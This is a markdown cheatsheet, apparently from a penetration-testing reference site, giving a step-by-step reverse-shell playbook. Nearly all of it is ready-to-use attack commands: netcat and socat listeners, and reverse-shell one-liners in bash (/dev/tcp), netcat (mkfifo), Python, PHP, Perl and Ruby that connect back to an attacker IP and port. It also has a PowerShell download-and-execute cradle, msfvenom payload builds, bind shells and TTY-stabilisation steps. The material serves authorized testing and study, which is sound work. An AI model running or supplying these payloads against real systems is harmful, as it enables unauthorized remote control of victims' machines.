---
name: Reverse Shells
category: Cheatsheets & Playbooks
description: Step-by-step — listen, fire a payload, stabilize, keep the shell.
tags: [reverse-shell, bind-shell, payload, oscp, tty, listener]
---

# Reverse Shells

A step-by-step playbook to get an interactive shell back from a target. Set `IP` and `PORT` to your listener. Use only on systems you're authorized to test.

## Step 1 — Start a listener (on your machine)

Do this **before** firing the payload, or the connection has nothing to reach.

```bash
nc -lvnp 4444                       # plain netcat
rlwrap nc -lvnp 4444                 # with readline (history, arrows) — recommended
ncat -lvnp 4444 --ssl                # TLS, if the payload uses it
```

Leave it running and open the target's execution vector (RCE, upload, command injection…) in another terminal.

## Step 2 — Fire a reverse shell from the target

Pick **one** payload based on what the target has installed. Try the next language if the first is blocked or missing.

### Bash

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
sh -i >& /dev/tcp/IP/PORT 0>&1
# if the input mangles special chars, base64-wrap it:
echo -n 'bash -i >& /dev/tcp/IP/PORT 0>&1' | base64
bash -c '{echo,BASE64HERE}|{base64,-d}|bash'
```

### sh / netcat (no -e needed)

```bash
nc IP PORT -e /bin/sh                          # if this nc build supports -e
# portable version, works without -e:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
busybox nc IP PORT -e /bin/sh
```

### Python

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP / Perl / Ruby

```bash
php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e 'c=TCPSocket.new("IP",PORT);loop{c.write(`#{c.gets}`)}'
```

### PowerShell (Windows target)

A `TCPClient` reads commands, runs them with `iex`, and writes the output back. AV flags this heavily, so operators usually host the script and pull it in memory:

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/rev.ps1')"
```

`rev.ps1` opens `Net.Sockets.TCPClient('IP',PORT)`, loops on the stream, runs each line via `Invoke-Expression`, and returns the result. Ready-made: Nishang `Invoke-PowerShellTcp`, or revshells.com.

### socat (full TTY on both ends)

```bash
# Step 1 alternative — start this listener instead:
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# Step 2 — on the target:
socat TCP:IP:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

If you use this socat pair, you already have a full TTY and can skip Step 3.

### msfvenom (when you need a file/binary payload)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o s.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o s.exe
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o s.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o s.jsp
# catch with a handler:  msfconsole -> use exploit/multi/handler
```

## Step 3 — Stabilize the shell (get a real TTY)

A raw `nc` shell has no tab-completion, no arrows, and Ctrl+C kills it. Upgrade it:

```bash
# 3a. spawn a pty on the target
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or: script -qc /bin/bash /dev/null

# 3b. background it: press Ctrl+Z, then on YOUR machine:
stty raw -echo; fg

# 3c. back in the shell, fix the terminal:
export TERM=xterm; export SHELL=/bin/bash
stty rows 50 cols 200            # match your window (run 'stty -a' locally to get sizes)
```

Now Ctrl+C, arrows, tab and `less`/`vim` behave normally.

## Step 4 — Keep it and move on

- Run the listener inside [tmux](#/tool/tmux) so a dropped connection doesn't kill your session.
- Note the shell's user/privileges (`id` / `whoami /priv`).
- Continue with the [Linux PrivEsc](#/tool/privesc-linux) or [Windows PrivEsc](#/tool/privesc-windows) checklist.

### Bind shell (fallback: target listens, you connect)

Use when the target can't reach you (egress filtered) but you can reach it:

```bash
# on the target
nc -lvnp 4444 -e /bin/bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
# on your machine
nc TARGET 4444
```

> The building blocks are [netcat](#/tool/netcat), [socat](#/tool/socat) and [msfconsole](#/tool/msfconsole). If egress is HTTP-only, tunnel out with [chisel](#/tool/chisel) instead of a direct connect-back.
